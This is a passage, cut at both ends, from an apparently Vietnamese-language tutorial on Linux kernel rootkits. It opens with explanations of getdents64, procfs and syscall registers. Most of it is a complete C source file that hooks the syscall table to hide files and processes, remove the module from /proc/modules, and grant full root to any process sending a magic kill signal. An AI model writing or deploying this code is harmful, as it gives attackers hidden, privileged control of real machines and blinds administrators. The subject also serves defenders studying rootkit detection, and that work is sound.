                             Userspace dung gia tri nay de nhay toi
                             entry ke tiep: next = (char*)cur + d_reclen
                             Day la field rootkit exploit de "nuot" entries.

+18     1      d_type       (u8) Loai file:
                             DT_REG  = 8  (regular file)
                             DT_DIR  = 4  (directory)
                             DT_LNK  = 10 (symbolic link)
                             DT_SOCK = 12 (socket)
                             DT_FIFO = 1  (named pipe)
                             DT_BLK  = 6  (block device)
                             DT_CHR  = 2  (character device)

+19     var    d_name[]     (char[]) Filename, null-terminated.
                             Do dai thay doi (1 byte cho "." den 255 bytes).
                             Padding sau null byte de d_reclen aligned.

        padding              Bytes 0 cho den d_reclen boundary.
                             Tong d_reclen thuong aligned 8 bytes.
+d_reclen                    --- Entry ke tiep bat dau tai day ---


Vi du cu the — buffer chua 3 entries:

Offset   Hex dump                              Decoded
------   --------                              -------
0x0000   01 00 00 00 00 00 00 00              d_ino = 1
0x0008   18 00 00 00 00 00 00 00              d_off = 24
0x0010   18 00                                d_reclen = 24
0x0012   04                                   d_type = DT_DIR (4)
0x0013   2E 00 00 00 00                       d_name = ".\0" + 3 padding
                                              --- entry 1: "." (current dir) ---

0x0018   02 00 00 00 00 00 00 00              d_ino = 2
0x0020   30 00 00 00 00 00 00 00              d_off = 48
0x0028   18 00                                d_reclen = 24
0x002A   04                                   d_type = DT_DIR
0x002B   2E 2E 00 00 00                       d_name = "..\0" + 2 padding
                                              --- entry 2: ".." (parent dir) ---

0x0030   A1 03 00 00 00 00 00 00              d_ino = 929
0x0038   48 00 00 00 00 00 00 00              d_off = 72
0x0040   20 00                                d_reclen = 32
0x0042   08                                   d_type = DT_REG (8)
0x0043   72 6B 5F 63 6F 6E 66 69 67 00 00 .. d_name = "rk_config\0" + pad
                                              --- entry 3: "rk_config" (HIDDEN!) ---

Return value cua getdents64 = 0x0060 (96 bytes = tong d_reclen)

Sau khi rootkit filter entry 3:
  - Neu entry 3 la entry dau: memmove entries 1,2 len, ret = 48
  - Neu entry 3 o giua: entry_truoc->d_reclen += 32, ret giu nguyen
    (nhung userspace se nhay qua entry 3)
```

#### getdents64 syscall flow trong kernel

Day la luong xu ly day du khi userspace goi `getdents64(fd, buf, count)`:

```
sys_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, 
               unsigned int count)
  |
  v
f = fdget(fd)                      // Lay struct file* tu fd number
  |                                // fdget() dung files_struct cua process
  |                                // files_struct->fd_array[fd] = file*
  v
iterate_dir(f.file, &buf.ctx)      // Bat dau iterate directory
  |
  |  buf la struct getdents_callback64:
  |    .ctx.actor = filldir64      // Callback function cho moi entry
  |    .current_dir = dirent       // User buffer pointer
  |    .count = count              // Buffer size remaining
  |
  v
f.file->f_op->iterate_shared(file, ctx)
  |
  |  f_op la file_operations cua filesystem:
  |    ext4:    ext4_readdir()
  |    procfs:  proc_readdir() -> proc_pid_readdir()
  |    tmpfs:   dcache_readdir()
  |    ...
  |
  |  Filesystem-specific code iterate entries va goi:
  v
dir_emit(ctx, name, namlen, ino, type)
  |
  |  dir_emit() goi ctx->actor() = filldir64()
  v
filldir64(ctx, name, namlen, offset, ino, d_type)
  |
  |  1. Check buf->count >= reclen (con du space?)
  |  2. Build linux_dirent64 entry:
  |     - d_ino = ino
  |     - d_off = offset  
  |     - d_reclen = ALIGN(offsetof(d_name) + namlen + 1, 8)
  |     - d_type = d_type
  |     - d_name = name (copy name string)
  |  3. copy_to_user(buf->current_dir, &entry, reclen)
  |     (TRUC TIEP ghi vao userspace buffer)
  |  4. buf->current_dir += reclen
  |  5. buf->count -= reclen
  |  6. Return 0 (success) hoac -EFAULT (copy failed)
  v
[... repeat cho moi directory entry ...]
  |
  v
Return total bytes written = count - buf.count
```

Quan trong: `filldir64()` ghi TRUC TIEP vao userspace buffer. Khi rootkit hook getdents64, original handler da ghi data vao userspace. Rootkit phai copy tu userspace vao kernel, filter, roi copy nguoc lai.

#### procfs /proc/<pid> — Virtual filesystem internals

`/proc` la mot pseudo-filesystem (khong co backing storage tren disk). Moi file/directory trong /proc duoc tao DYNAMICALLY khi duoc access:

```
procfs architecture:
                                    
/proc/                              
  |-- 1/         <- proc_pid_readdir() tao entry nay cho PID 1
  |   |-- status <- proc_pid_status() generate noi dung
  |   |-- maps   <- proc_pid_maps()
  |   |-- cmdline<- proc_pid_cmdline()
  |   +-- ...    
  |-- 1234/      <- PID 1234 (tuong tu)
  |-- self/      <- symlink toi /proc/<current PID>
  |-- cpuinfo    <- cpuinfo_open() -> seq_file
  |-- modules    <- modules_open() -> iterate module list
  |-- net/       
  |   |-- tcp    <- tcp4_seq_show() cho moi connection
  |   +-- udp    <- udp4_seq_show()
  +-- kallsyms   <- kallsyms_open()

Khi ls /proc:
  1. getdents64(fd_of_proc, buf, count)
  2. iterate_dir() -> proc_readdir()
  3. proc_readdir() goi proc_pid_readdir() cho PID entries
  4. proc_pid_readdir():
     - Goi for_each_process(task) 
       (iterate TOAN BO task_struct linked list)
     - Cho moi task, goi:
       tgid_nr_ns(task, &init_pid_ns) -> lay PID number
     - Goi dir_emit(ctx, pid_string, ...) -> filldir64()
       -> ghi PID entry vao user buffer

Rootkit an process = lam cho filldir64 KHONG duoc goi cho PID do.
Cach 1: Hook getdents64, filter entry SAU KHI kernel da ghi (post-hook)
Cach 2: DKOM — remove task tu linked list (Chapter 6)
Cach 3: Hook proc_pid_readdir() truc tiep (kho hon nhung sach hon)
```

#### pt_regs va syscall arguments tren x86-64

Tu kernel 4.17+, tat ca syscall handlers nhan `const struct pt_regs *regs` thay vi arguments truc tiep. Day la mapping giua registers va pt_regs fields:

```
struct pt_regs (defined trong arch/x86/include/asm/ptrace.h):
+-----------------------------------------------------------+
| Offset | Field     | Register | Syscall role               |
+--------+-----------+----------+----------------------------+
|   0    | r15       | R15      | (callee-saved)             |
|   8    | r14       | R14      | (callee-saved)             |
|  16    | r13       | R13      | (callee-saved)             |
|  24    | r12       | R12      | (callee-saved)             |
|  32    | bp        | RBP      | (frame pointer)            |
|  40    | bx        | RBX      | (callee-saved)             |
|  48    | r11       | R11      | (saved RFLAGS by SYSCALL)  |
|  56    | r10       | R10      | Syscall arg4               |
|  64    | r9        | R9       | Syscall arg6               |
|  72    | r8        | R8       | Syscall arg5               |
|  80    | ax        | RAX      | RETURN VALUE (sau syscall)  |
|  88    | cx        | RCX      | (saved RIP by SYSCALL)     |
|  96    | dx        | RDX      | Syscall arg3               |
| 104    | si        | RSI      | Syscall arg2               |
| 112    | di        | RDI      | Syscall arg1               |
| 120    | orig_ax   | (saved)  | SYSCALL NUMBER (orig RAX)  |
| 128    | ip        | RIP      | User instruction pointer   |
| 136    | cs        | CS       | Code segment               |
| 144    | flags     | RFLAGS   | User flags                 |
| 152    | sp        | RSP      | User stack pointer         |
| 160    | ss        | SS       | Stack segment              |
+-----------------------------------------------------------+

Syscall argument mapping (QUAN TRONG):
  Argument  Register  pt_regs field  Ghi chu
  ────────  ────────  ─────────────  ───────
  syscall#  RAX       regs->orig_ax  KHONG PHAI regs->ax!
                                     regs->ax = return value
  arg1      RDI       regs->di       
  arg2      RSI       regs->si       
  arg3      RDX       regs->dx       
  arg4      R10       regs->r10      KHONG PHAI RCX!
                                     (SYSCALL clobber RCX de save RIP)
  arg5      R8        regs->r8       
  arg6      R9        regs->r9       
  return    RAX       regs->ax       Hook modify field nay de thay
                                     doi return value

Vi du: getdents64(unsigned int fd, struct linux_dirent64 *dirent, 
                  unsigned int count)
  fd     = (unsigned int)regs->di
  dirent = (struct linux_dirent64 __user *)regs->si
  count  = (unsigned int)regs->dx
```

#### copy_to_user / copy_from_user — Kernel<->User data transfer

Kernel code KHONG DUOC truc tiep dereference user pointers. Phai dung `copy_from_user()` va `copy_to_user()`:

```
Tai sao KHONG the dung memcpy/pointer dereference:

1. SMAP (Supervisor Mode Access Prevention) — CPU feature:
   Khi SMAP enabled (CR4.SMAP = 1), Ring 0 code KHONG the
   doc/ghi user pages. Violation -> #PF (page fault).
   copy_from_user() tam thoi disable SMAP bang STAC instruction,
   copy xong roi CLAC enable lai.

2. Page fault handling:
   User page co the swapped out (on disk, khong co trong RAM).
   memcpy se crash (page fault trong kernel = oops).
   copy_from_user() co exception table entry -> neu fault xay ra,
   tra ve error thay vi crash.

3. Address validation:
   access_ok(addr, size) kiem tra addr + size nam trong user range
   (< TASK_SIZE, thuong = 0x00007FFFFFFFFFFF tren x86-64).
   Ngan kernel doc/ghi kernel memory qua user pointer (Confused Deputy).

4. __user annotation:
   Day la compile-time marker (khong anh huong runtime).
   sparse checker canh bao neu ban dereference __user pointer truc tiep.
   Giup developer khong quen dung copy_from_user/copy_to_user.

Internally, copy_from_user(kernel_dst, user_src, size):
  1. access_ok(user_src, size)  // check range
  2. stac                       // disable SMAP
  3. memcpy with exception handling
     (neu page fault -> return bytes NOT copied)
  4. clac                       // re-enable SMAP
  5. Return 0 (success) hoac N (N bytes khong copy duoc)
```

---

### 3.1 Complete hookable rootkit — File & Process Hiding + Give Root

```c
/* hooks.c — Syscall hooking engine
 *
 * File nay implement:
 * 1. Hook getdents64: an files va processes (trong /proc)
 * 2. Hook kill: magic signal triggers (give root, hide module, hide PID)
 * 3. Hook read: filter /proc/modules output (backup hiding cho module)
 *
 * Architecture:
 *   Original flow:     user -> syscall -> ORIGINAL_HANDLER -> return
 *   Hooked flow:       user -> syscall -> OUR_HOOK -> ORIGINAL_HANDLER -> OUR_FILTER -> return
 *
 *   Hook function wrap original: goi original handler, roi modify ket qua
 *   truoc khi return cho user. Day goi la "post-hook" pattern.
 *
 *   Co 2 patterns:
 *   a) Pre-hook:  modify arguments TRUOC KHI goi original
 *                 Vi du: thay filename argument -> redirect file access
 *   b) Post-hook: goi original TRUOC, roi modify return value/buffer
 *                 Vi du: goi getdents64 that, roi filter entries tu result
 *
 *   Rootkit thuong dung post-hook cho hiding (de original function
 *   van thu thap data day du, ta chi loc bo entries can an).
 */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * GLOBAL STATE
 * ══════════════════════════════════════════════════════════════ */

/* Pointer toi sys_call_table — set boi find_syscall_table() */
static unsigned long *sys_call_table = NULL;

/* Save original syscall handlers de:
 * 1. Goi trong hook function (can original behavior)
 * 2. Restore khi unload module (clean exit) */
static syscall_fn_t orig_getdents64 = NULL;
static syscall_fn_t orig_getdents   = NULL;
static syscall_fn_t orig_kill       = NULL;
static syscall_fn_t orig_read       = NULL;

/* Danh sach PIDs dang bi an.
 * Gioi han static 64 PIDs. San pham that dung dynamic list. */
#define MAX_HIDDEN_PIDS 64
static pid_t hidden_pids[MAX_HIDDEN_PIDS];
static int hidden_pid_count = 0;
static DEFINE_SPINLOCK(pid_lock);  /* Lock cho concurrent access */

/* Module visibility state */
static bool module_hidden = false;

/* ══════════════════════════════════════════════════════════════
 * PID MANAGEMENT — Track processes can an
 * ══════════════════════════════════════════════════════════════ */

static bool is_pid_hidden(pid_t pid)
{
    int i;
    bool found = false;

    spin_lock(&pid_lock);
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid) {
            found = true;
            break;
        }
    }
    spin_unlock(&pid_lock);
    return found;
}

static void add_hidden_pid(pid_t pid)
{
    spin_lock(&pid_lock);
    if (hidden_pid_count < MAX_HIDDEN_PIDS) {
        hidden_pids[hidden_pid_count++] = pid;
        pr_info("rk: hiding PID %d\n", pid);
    }
    spin_unlock(&pid_lock);
}

static void remove_hidden_pid(pid_t pid)
{
    int i;
    spin_lock(&pid_lock);
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid) {
            /* Shift remaining entries */
            memmove(&hidden_pids[i], &hidden_pids[i + 1],
                    (hidden_pid_count - i - 1) * sizeof(pid_t));
            hidden_pid_count--;
            break;
        }
    }
    spin_unlock(&pid_lock);
}

/* ══════════════════════════════════════════════════════════════
 * HOOK: getdents64 — An files va processes
 *
 * getdents64() la syscall dung sau ls, find, readdir().
 *
 * Flow binh thuong:
 *   ls -> getdents64(fd, buffer, bufsize) -> kernel fills buffer
 *   voi mang struct linux_dirent64:
 *
 *   +------------+------------+------------+-----+
 *   | dirent #1  | dirent #2  | dirent #3  | ... |
 *   +------------+------------+------------+-----+
 *
 *   Moi dirent:
 *   struct linux_dirent64 {
 *       u64  d_ino;        // Inode number
 *       s64  d_off;        // Offset to next dirent
 *       u16  d_reclen;     // Length of this record (variable!)
 *       u8   d_type;       // File type (DT_REG, DT_DIR, etc.)
 *       char d_name[];     // Filename (null-terminated, variable length)
 *   };
 *
 *   d_reclen la variable vi d_name co do dai khac nhau.
 *   Cac dirents packed lien tiep, khong padding.
 *   Tong kich thuoc tat ca dirents = return value cua getdents64().
 *
 * Hook strategy:
 *   1. Goi original getdents64() -> kernel fill buffer trong userspace
 *   2. Copy buffer tu userspace vao kernelspace
 *   3. Duyet tung dirent, loc bo entries can an
 *   4. Copy ket qua filtered tro lai userspace
 *   5. Return adjusted size (giam di size cua entries bi loc)
 *
 * An files:  entry co d_name bat dau bang HIDDEN_PREFIX
 * An process: fd tro toi /proc, d_name la PID nam trong hidden_pids[]
 * ══════════════════════════════════════════════════════════════ */

/* Kiem tra fd co dang tro toi /proc hay khong.
 *
 * Tai sao can: /proc chua thu muc cho moi process (named by PID).
 * ls /proc -> getdents64 -> ta filter entries co PID can an.
 * Nhung getdents64 cung duoc goi cho moi directory khac.
 * Ta chi muon filter PIDs khi doc /proc, khong phai /home/user/.
 *
 * Cach check: theo fd -> file struct -> dentry -> inode -> superblock
 * Neu superblock type la "proc" -> dang doc /proc. */
static bool is_proc_dir(int fd)
{
    struct fd f;
    struct inode *inode;
    bool is_proc = false;

    /* fdget() lay struct file tu file descriptor.
     * Tuong tu fget() nhung lightweight (khong tang refcount
     * trong moi truong hop — dung RCU protection thay vao). */
    f = fdget(fd);
    if (!f.file)
        return false;

    /* Navigate: file -> dentry -> inode -> superblock -> type name
     *
     * f.file->f_path.dentry = directory entry
     * dentry->d_inode = inode (in-memory representation of file)
     * inode->i_sb = superblock (filesystem instance)
     * i_sb->s_type->name = filesystem type name ("proc", "ext4", ...) */
    inode = file_inode(f.file);
    if (inode && inode->i_sb && inode->i_sb->s_type)
        is_proc = (strcmp(inode->i_sb->s_type->name, "proc") == 0);

    fdput(f);
    return is_proc;
}

static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
{
    /* Extract arguments tu registers.
     * getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count)
     * fd    = regs->di  (arg1)
     * dirent = regs->si  (arg2, userspace pointer)
     * count  = regs->dx  (arg3) */
    int fd = (int)regs->di;
    struct linux_dirent64 __user *user_dirent =
        (struct linux_dirent64 __user *)regs->si;

    /* Goi original getdents64.
     * Return value = total bytes of dirent data,
     * hoac 0 (end of directory), hoac negative (error). */
    long ret = orig_getdents64(regs);

    struct linux_dirent64 *kern_dirent = NULL;  /* Kernel-space copy */
    struct linux_dirent64 *current_entry;        /* Iterator */
    struct linux_dirent64 *prev_entry = NULL;    /* Previous entry (for unlinking) */
    unsigned long offset = 0;
    bool is_proc = false;
    long original_ret = ret;

    /* Neu original tra ve 0 (empty dir) hoac error -> pass through */
    if (ret <= 0)
        return ret;

    /* Allocate kernel buffer va copy data tu userspace.
     *
     * Tai sao copy: ta khong the safely iterate userspace buffer
     * trong kernel context (page fault risk, TOCTOU race).
     * Copy vao kernel -> modify -> copy nguoc lai.
     *
     * GFP_KERNEL: allocation CO THE sleep (process context OK).
     * Dung GFP_ATOMIC neu trong interrupt context. */
    kern_dirent = kzalloc(ret, GFP_KERNEL);
    if (!kern_dirent)
        return ret;  /* Allocation fail -> tra ve unfiltered result */

    /* copy_from_user(): copy data tu userspace vao kernel buffer.
     * Return 0 on success, non-zero = number of bytes NOT copied.
     *
     * PHAI dung copy_from_user() (khong phai memcpy) vi:
     * 1. Userspace pointer co the invalid -> page fault handled gracefully
     * 2. SMAP enforcement — kernel khong access user pages truc tiep
     * 3. copy_from_user() co proper access checking */
    if (copy_from_user(kern_dirent, user_dirent, ret)) {
        kfree(kern_dirent);
        return ret;
    }

    /* Kiem tra co dang doc /proc khong (cho PID hiding) */
    is_proc = is_proc_dir(fd);

    /* ────── Duyet va filter entries ──────
     *
     * Memory layout cua kern_dirent buffer:
     *
     * offset=0          offset+=d_reclen[0]    offset+=d_reclen[1]
     *   v                    v                      v
     *   +--------------+----------------+------------------+
     *   |  entry 0     |   entry 1      |   entry 2        |
     *   |  d_reclen=32 |   d_reclen=40  |   d_reclen=28    |
     *   |  d_name="."  |   d_name="rk_" |   d_name="foo"   |
     *   +--------------+----------------+------------------+
     *                    ^ HIDDEN (prefix match)
     *
     * De "xoa" entry, ta co 2 strategies:
     *
     * Strategy A (dung o day): Tang d_reclen cua entry TRUOC
     *   Entry truoc "nuot" entry can an bang cach mo rong d_reclen.
     *   Userspace code dung d_reclen de nhay toi entry ke tiep,
     *   nen entry bi "nuot" se bi skip.
     *
     *   Truoc:  [entry_prev, reclen=32] [entry_hidden, reclen=40] [entry_next]
     *   Sau:    [entry_prev, reclen=72]                           [entry_next]
     *
     * Strategy B: memmove entries phia sau len, giam total ret.
     *   Don gian hon nhung memmove costly neu nhieu entries.
     *
     * Edge case: entry can an la entry DAU TIEN (khong co prev).
     * -> Dung memmove day moi thu len, giam ret.
     */

    offset = 0;
    while (offset < ret) {
        current_entry = (struct linux_dirent64 *)((char *)kern_dirent + offset);

        /* Validate d_reclen — protect against corrupted entries.
         * d_reclen == 0 -> offset khong advance -> infinite loop.
         * d_reclen > remaining -> overread past buffer boundary. */
        if (current_entry->d_reclen == 0)
            break;
        if (current_entry->d_reclen > (ret - offset))
            break;

        bool should_hide = false;

        /* Check 1: File hiding — d_name bat dau bang HIDDEN_PREFIX */
        if (strncmp(current_entry->d_name, HIDDEN_PREFIX,
                    strlen(HIDDEN_PREFIX)) == 0) {
            should_hide = true;
        }

        /* Check 2: Process hiding — dang doc /proc va d_name la PID an */
        if (is_proc && !should_hide) {
            long pid_val;
            /* kstrtol: convert string -> long. Return 0 on success.
             * Neu d_name khong phai number -> khong phai PID entry -> skip */
            if (kstrtol(current_entry->d_name, 10, &pid_val) == 0) {
                if (is_pid_hidden((pid_t)pid_val))
                    should_hide = true;
            }
        }

        if (should_hide) {
            /* Case: entry can an la entry dau tien */
            if (current_entry == kern_dirent) {
                /* Shift moi thu len, overwrite entry dau.
                 * ret giam = size entry bi remove. */
                ret -= current_entry->d_reclen;
                memmove(current_entry,
                        (char *)current_entry + current_entry->d_reclen,
                        ret);
                /* KHONG tang offset — vi tri hien tai gio chua
                 * entry ke tiep (da shift len), can check lai. */
                continue;
            }

            /* Case: entry o giua hoac cuoi — "nuot" vao entry truoc */
            prev_entry->d_reclen += current_entry->d_reclen;
            /* Khong can memmove — entry van o do nhung userspace
             * se skip no vi prev->d_reclen da mo rong qua. */
        } else {
            /* Entry hop le — ghi nho lam prev cho lan sau */
            prev_entry = current_entry;
        }

        offset += current_entry->d_reclen;
    }

    /* Copy ket qua filtered tro lai userspace */
    copy_to_user(user_dirent, kern_dirent, ret);

    kfree(kern_dirent);
    return ret;
}

/* ══════════════════════════════════════════════════════════════
 * HOOK: getdents (legacy) — Separate handler cho struct linux_dirent
 *
 * KHONG dung chung hooked_getdents64 cho getdents vi struct KHAC:
 *   linux_dirent:   { unsigned long d_ino, d_off; unsigned short d_reclen; char d_name[] }
 *   linux_dirent64: { __u64 d_ino; __s64 d_off; unsigned short d_reclen; __u8 d_type; char d_name[] }
 *
 * Dung chung → corrupt d_name offset (thieu d_type field trong linux_dirent).
 * Modern glibc chi dung getdents64, nhung 32-bit compat binaries van dung getdents.
 * ══════════════════════════════════════════════════════════════ */

struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};

static asmlinkage long hooked_getdents(const struct pt_regs *regs)
{
    int fd = (int)regs->di;
    struct linux_dirent __user *user_dirent =
        (struct linux_dirent __user *)regs->si;

    long ret = orig_getdents(regs);

    struct linux_dirent *kern_dirent = NULL;
    struct linux_dirent *current_entry;
    struct linux_dirent *prev_entry = NULL;
    unsigned long offset = 0;
    bool is_proc = false;
    long original_ret = ret;

    if (ret <= 0)
        return ret;

    kern_dirent = kzalloc(ret, GFP_KERNEL);
    if (!kern_dirent)
        return ret;

    if (copy_from_user(kern_dirent, user_dirent, ret)) {
        kfree(kern_dirent);
        return ret;
    }

    is_proc = is_proc_dir(fd);

    offset = 0;
    while (offset < ret) {
        current_entry = (struct linux_dirent *)((char *)kern_dirent + offset);
        if (current_entry->d_reclen == 0)
            break;
        if (current_entry->d_reclen > (ret - offset))
            break;

        bool should_hide = false;
        if (strncmp(current_entry->d_name, HIDDEN_PREFIX,
                    strlen(HIDDEN_PREFIX)) == 0)
            should_hide = true;

        if (is_proc && !should_hide) {
            long pid_val;
            if (kstrtol(current_entry->d_name, 10, &pid_val) == 0) {
                if (is_pid_hidden((pid_t)pid_val))
                    should_hide = true;
            }
        }

        if (should_hide) {
            if (current_entry == kern_dirent) {
                ret -= current_entry->d_reclen;
                memmove(current_entry,
                        (char *)current_entry + current_entry->d_reclen,
                        ret);
                continue;
            }
            prev_entry->d_reclen += current_entry->d_reclen;
        } else {
            prev_entry = current_entry;
        }
        offset += current_entry->d_reclen;
    }

    copy_to_user(user_dirent, kern_dirent, ret);
    kfree(kern_dirent);
    return ret;
}

/* ══════════════════════════════════════════════════════════════
 * HOOK: kill — Magic signal command interface
 *
 * Tai sao dung kill():
 * 1. kill() la syscall "vo hai" — khong ai suspect
 * 2. Co the goi tu bat ky dau: kill -54 31337
 * 3. Flexible: dung PID parameter de encode command
 * 4. Khong can file/socket — stateless triggering
 *
 * APT pattern: BPFDoor dung magic packet, Drovorub dung ioctl.
 * kill() signal approach pho bien trong educational rootkits
 * (Diamorphine, Reptile). APT thuong dung network trigger
 * vi khong can local access.
 *
 * Command encoding:
 *   signal = MAGIC_SIGNAL (54)
 *   pid    = command selector:
 *     - MAGIC_PID (31337):      give root cho calling process
 *     - HIDE_MODULE_PID (31338): toggle module visibility
 *     - Any real PID:           toggle hide/show cho process do
 * ══════════════════════════════════════════════════════════════ */

static asmlinkage long hooked_kill(const struct pt_regs *regs)
{
    pid_t target_pid = (pid_t)regs->di;  /* arg1: target PID */
    int   sig        = (int)regs->si;    /* arg2: signal number */

    /* Chi intercept magic signal — moi signal khac pass through */
    if (sig != MAGIC_SIGNAL)
        return orig_kill(regs);

    /* ──── Command: Give Root ──── */
    if (target_pid == MAGIC_PID) {
        /* prepare_creds(): allocate ban copy cua current credentials.
         *
         * Kernel credential model:
         *   Moi process co `cred` struct chua:
         *   - uid/gid: real user/group ID
         *   - euid/egid: effective (used cho permission checks)
         *   - suid/sgid: saved (cho seteuid)
         *   - fsuid/fsgid: filesystem (cho file access checks)
         *   - cap_*: capabilities (fine-grained privileges)
         *
         *   Credentials la immutable — de thay doi:
         *   1. prepare_creds() -> tao ban copy mutable
         *   2. Modify ban copy
         *   3. commit_creds() -> swap ban cu bang ban moi atomically
         *
         *   Tai sao immutable + copy-on-write:
         *   - Thread-safe: threads khac doc cred cu khong bi race
         *   - RCU-protected: readers lock-free
         */
        struct cred *new_cred = prepare_creds();
        if (!new_cred)
            return -ENOMEM;

        /* Set all IDs to 0 (root) */
        new_cred->uid.val   = 0;   /* Real UID */
        new_cred->gid.val   = 0;   /* Real GID */
        new_cred->euid.val  = 0;   /* Effective UID — permission checks */
        new_cred->egid.val  = 0;   /* Effective GID */
        new_cred->suid.val  = 0;   /* Saved UID */
        new_cred->sgid.val  = 0;   /* Saved GID */
        new_cred->fsuid.val = 0;   /* Filesystem UID — file access */
        new_cred->fsgid.val = 0;   /* Filesystem GID */

        /* Grant ALL Linux capabilities.
         *
         * Capabilities = fine-grained root privileges:
         *   CAP_SYS_ADMIN:  mount, syslog, many admin ops
         *   CAP_NET_RAW:    raw sockets
         *   CAP_SYS_MODULE: load/unload kernel modules
         *   CAP_SYS_PTRACE: ptrace any process
         *   CAP_DAC_OVERRIDE: bypass file permission checks
         *   ... 40+ capabilities total
         *
         * CAP_FULL_SET = bitmask voi tat ca capability bits = 1.
         * Setting tat ca 5 capability sets = unrestricted root. */
        new_cred->cap_inheritable = CAP_FULL_SET;
        new_cred->cap_permitted   = CAP_FULL_SET;
        new_cred->cap_effective   = CAP_FULL_SET;
        new_cred->cap_bset        = CAP_FULL_SET;
        new_cred->cap_ambient     = CAP_FULL_SET;

        /* commit_creds(): Atomic swap cred cu bang cred moi.
         *
         * Tu thoi diem nay, current process = root + full caps.
         * Process CO THE:
         *   - Read/write moi file
         *   - Kill moi process
         *   - Load kernel modules
         *   - Mount filesystems
         *   - Moi thu root lam duoc
         *
         * commit_creds() cung free cred cu (via RCU). */
        commit_creds(new_cred);

        return 0;  /* Return 0 (success) — user thay kill() thanh cong */
    }

    /* ──── Command: Toggle Module Visibility ──── */
    if (target_pid == HIDE_MODULE_PID) {
        if (module_hidden) {
            rk_show_module();
            module_hidden = false;
        } else {
            rk_hide_module();
            module_hidden = true;
        }
        return 0;
    }

    /* ──── Command: Toggle Process Hiding ──── */
    if (is_pid_hidden(target_pid)) {
        remove_hidden_pid(target_pid);
    } else {
        add_hidden_pid(target_pid);
    }

    return 0;
}

/* ══════════════════════════════════════════════════════════════
 * HOOK: read — Filter /proc/modules output (backup module hiding)
 *
 * Tai sao hook read():
 *   cat /proc/modules hoac lsmod goi read() tren /proc/modules.
 *   Output chua ten tat ca loaded modules.
 *   Hook read() cho /proc/modules -> filter dong co ten rootkit.
 *
 * Day la BACKUP cho module list_del hiding (Chapter 6).
 * Du da list_del, mot so tools access /proc/modules truc tiep
 * hoac qua sysfs, nen can defense-in-depth.
 *
 * CANH BAO: Hook read() anh huong PERFORMANCE vi read()
 * la syscall duoc goi nhieu nhat. Phai check nhanh va bail
 * som neu khong phai target file.
 * ══════════════════════════════════════════════════════════════ */

/* Kiem tra xem file descriptor co tro toi file cu the khong */
static bool is_target_file(int fd, const char *target_path)
{
    struct fd f;
    char buf[256];
    char *path;
    bool match = false;

    f = fdget(fd);
    if (!f.file)
        return false;

    /* d_path(): convert dentry -> full path string.
     * Can buffer vi path build nguoc tu dentry len root. */
    path = d_path(&f.file->f_path, buf, sizeof(buf));
    if (!IS_ERR(path))
        match = (strcmp(path, target_path) == 0);

    fdput(f);
    return match;
}

static asmlinkage long hooked_read(const struct pt_regs *regs)
{
    int fd = (int)regs->di;
    char __user *user_buf = (char __user *)regs->si;

    /* Goi original read truoc */
    long ret = orig_read(regs);

    char *kern_buf;
    char *line_start, *line_end;

    if (ret <= 0)
        return ret;

    /* Fast path: chi filter /proc/modules
     * Goi is_target_file() chi khi ret > 0 de tranh overhead. */
    if (!is_target_file(fd, "/proc/modules"))
        return ret;  /* Khong phai target -> tra ve nguyen */

    /* Copy, filter, copy back — giong pattern getdents64 */
    kern_buf = kzalloc(ret + 1, GFP_KERNEL);
    if (!kern_buf)
        return ret;

    if (copy_from_user(kern_buf, user_buf, ret)) {
        kfree(kern_buf);
        return ret;
    }
    kern_buf[ret] = '\0';

    /* /proc/modules format (moi dong = 1 module):
     *   "module_name size refcount deps state address\n"
     *   Vi du: "rk 16384 0 - Live 0xffffffffc0a80000\n"
     *
     * Filter: xoa moi dong chua ten module rootkit. */
    line_start = kern_buf;
    while (*line_start) {
        line_end = strchr(line_start, '\n');
        if (!line_end)
            break;

        /* So sanh dau dong voi module name */
        if (strncmp(line_start, THIS_MODULE->name,
                    strlen(THIS_MODULE->name)) == 0) {
            /* Xoa dong nay bang cach shift phan con lai len */
            int line_len = (line_end + 1) - line_start;
            memmove(line_start, line_end + 1,
                    ret - (line_end + 1 - kern_buf));
            ret -= line_len;
            kern_buf[ret] = '\0';  /* Null-terminate tai boundary moi */
            /* Khong advance line_start — vi tri nay gio chua
             * dong ke tiep (da shift) */
            continue;
        }

        line_start = line_end + 1;
    }

    copy_to_user(user_buf, kern_buf, ret);
    kfree(kern_buf);
    return ret;
}

/* ══════════════════════════════════════════════════════════════
 * INSTALL / REMOVE — Hook lifecycle management
 * ══════════════════════════════════════════════════════════════ */

int rk_install_hooks(void)
{
    /* Step 1: Tim sys_call_table */
    sys_call_table = (unsigned long *)rk_lookup_name("sys_call_table");
    if (!sys_call_table) {
        pr_err("rk: cannot find sys_call_table\n");
        return -EFAULT;
    }
    pr_info("rk: sys_call_table @ 0x%lx\n", (unsigned long)sys_call_table);

    /* Step 2: Save original handlers.
     *
     * CRITICAL: phai save TRUOC KHI overwrite.
     * Neu quen -> khong the goi original -> system unusable.
     * Neu quen restore khi rmmod -> crash sau khi module unloaded
     * vi syscall se jump toi freed memory. */
    orig_getdents64 = (syscall_fn_t)sys_call_table[__NR_getdents64];
    orig_getdents   = (syscall_fn_t)sys_call_table[__NR_getdents];
    orig_kill       = (syscall_fn_t)sys_call_table[__NR_kill];
    orig_read       = (syscall_fn_t)sys_call_table[__NR_read];

    /* Step 3: Overwrite syscall table entries.
     *
     * Giua unprotect va protect, code nay PHAI chay nhanh.
     * Khong allocate memory, khong sleep, khong goi function
     * phuc tap — chi ghi 8 bytes per entry.
     *
     * Barrier(mb/wmb) khong can vi chi ghi aligned 8-byte values
     * — x86 guarantees atomicity cho aligned quad-word writes. */
    rk_unprotect_memory();

    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    sys_call_table[__NR_getdents]   = (unsigned long)hooked_getdents;
    sys_call_table[__NR_kill]       = (unsigned long)hooked_kill;
    sys_call_table[__NR_read]       = (unsigned long)hooked_read;

    rk_protect_memory();

    pr_info("rk: syscall hooks installed\n");
    return 0;
}

void rk_remove_hooks(void)
{
    if (!sys_call_table)
        return;

    /* Restore original handlers.
     *
     * QUAN TRONG: phai restore theo dung thu tu:
